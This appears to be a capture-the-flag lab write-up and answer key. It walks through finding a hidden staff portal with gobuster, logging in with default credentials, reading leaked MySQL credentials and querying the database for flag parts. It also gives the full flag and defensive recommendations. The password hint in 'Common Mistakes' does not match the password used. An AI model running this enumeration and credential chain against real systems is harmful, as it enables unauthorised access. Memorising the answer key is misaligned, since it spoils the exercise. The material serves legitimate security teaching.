# NovaTech Solutions: Hidden Login Discovery

## Overview

Students perform a web application assessment against a corporate website. The main site appears to be a simple marketing page, but directory enumeration reveals a hidden staff portal with default credentials. The dashboard leaks database connection details, allowing direct access to a backend MySQL server. Flag parts are scattered across the discovered surfaces.

This lab reinforces **gobuster/dirb** as a core reconnaissance skill; students cannot progress without directory enumeration.

## Architecture

```
┌─────────────┐                    ┌─────────────┐
│   Student    │ ──── HTTP:80 ───▶ │   webapp     │
│   (Kali VM)  │                   │ (Flask app)  │
│              │                   └──────┬───────┘
│              │                          │ leaks DB creds
│              │                          ▼
│              │ ── MySQL:3306 ──▶ ┌─────────────┐
│              │  (direct access)  │  dbserver    │
└─────────────┘                    │ (MySQL 8.0)  │
                                   └──────────────┘
```

**Flag parts:**
- Part 1 (`h1dd3n`): HTML comment in the hidden staff portal login page
- Part 2 (`d3f4ult`): Displayed on the staff dashboard after login
- Part 3 (`3xp0s3d`): Stored in the MySQL `audit_tokens` table

## Solution Walkthrough

### Step 1: Initial Reconnaissance

Visit the website:
```bash
curl http://<webapp_ip>/
```

Check robots.txt:
```bash
curl http://<webapp_ip>/robots.txt
```

Output reveals hidden paths:
```
Disallow: /staff-portal/
Disallow: /backup/
Disallow: /api/
Disallow: /internal/
```

### Step 2: Directory Enumeration with Gobuster

```bash
gobuster dir -u http://<webapp_ip> -w /usr/share/wordlists/dirb/common.txt
```

Discovered paths include `/staff-portal/`, `/backup/`, `/api/`, `/about`, `/contact`, `/services`, etc.

### Step 3: Investigate the Staff Portal

```bash
curl -s http://<webapp_ip>/staff-portal/ | grep '<!--'
```

HTML comment reveals:
```html
<!-- NovaTech Staff Portal v2.1 | Build: h1dd3n-a7f2 | Deployed: 2024-09-15 staging-3 -->
```

**Token 1:** `h1dd3n`

### Step 4: Login with Default Credentials

```bash
curl -s -c cookies.txt -X POST http://<webapp_ip>/staff-portal/login \
    -d 'username=admin&password=NovaTech2024#' -L
```

The dashboard displays system status including:

| Component | Value |
|-----------|-------|
| Auth Token Prefix | `d3f4ult` |

**Token 2:** `d3f4ult`

### Step 5: Extract Database Credentials

The dashboard's "Application Configuration" panel shows:
```
DB_HOST=novatech-db
DB_PORT=3306
DB_NAME=novatech
DB_USER=novatech_app
DB_PASS=Pr0d_DB_2024#
```

### Step 6: Connect to MySQL

```bash
mysql -h <dbserver_ip> -u novatech_app -p'Pr0d_DB_2024#' novatech \
    -e "SELECT * FROM audit_tokens"
```

Output:
```
+----+---------------------+------------------+...+
| id | token_name          | token_value      |...|
+----+---------------------+------------------+...+
|  1 | db_health_check     | healthy_2024Q3   |...|
|  2 | backup_verification | bkp_verified_0914|...|
|  3 | assessment_marker   | 3xp0s3d          |...|
|  4 | schema_version      | v3.2.1_prod      |...|
+----+---------------------+------------------+...+
```

**Token 3:** `3xp0s3d`

### Step 7: Assemble Flag

```
OCR{h1dd3n_d3f4ult_3xp0s3d}
```

## Common Mistakes

- **Skipping directory enumeration.** The staff portal is not linked from any public page. Without gobuster/dirb, you won't find it.
- **Not checking robots.txt.** It's the first clue pointing to hidden paths.
- **Not reading HTML source.** Token 1 is in an HTML comment; it's invisible in the rendered page. Always view source.
- **Trying complex passwords.** The default credentials follow a simple pattern: `admin` / `CompanyName` + year + `!`
- **Ignoring the config panel.** The leaked DB credentials on the dashboard are the key to accessing the database server.
- **Trying to connect to MySQL with root.** Use the application credentials (`novatech_app`), not root.

## Technical Details

- **Web Server:** Python Flask running on port 80
- **Database:** MySQL 8.0 with application-level user permissions
- **Hidden Portal:** `/staff-portal/` with cookie-based session management
- **Vulnerability Chain:** Information disclosure → default credentials → credential leakage → database access

## Defensive Recommendations

- Remove or restrict access to administrative interfaces before production deployment
- Never use default credentials; enforce password changes on first login
- Remove HTML comments containing build info, version numbers, or internal references
- Never display database credentials in web interfaces; use environment variables with proper access controls
- Implement proper access controls on database servers (IP whitelisting, VPN-only access)
- Use robots.txt for SEO, not security; it actually advertises hidden paths to attackers
